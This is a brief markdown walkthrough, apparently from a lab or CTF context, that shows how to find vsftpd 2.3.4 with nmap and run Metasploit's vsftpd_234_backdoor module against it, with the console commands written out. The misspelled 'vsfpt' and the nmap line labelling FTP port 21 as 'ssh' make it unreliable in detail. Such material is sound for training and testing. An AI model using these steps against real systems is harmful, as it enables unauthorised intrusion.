# Exploiting vsfpt 2.3.4

## Information gathering
During information gathering using nmap you might come across with `vsfpt` port opened

```sh
PORT     STATE SERVICE VERSION
21/tcp   open  ssh     vsfpt 2.3.4
```

[Searching](https://duckduckgo.com/?q=vsfpt+2.3.4&atb=v161-1&ia=web) more informations about this version the first results was `rapid7` (creators of metasploit) links (eg. [rapid7 module exploit/unix/ftp/vsftpd_234_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)).<br>
Run into Metasploit console the following command 
```sh
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show targets
    ...targets...
msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
msf exploit(vsftpd_234_backdoor) > show options
    ...show and set options...
msf exploit(vsftpd_234_backdoor) > exploit
```
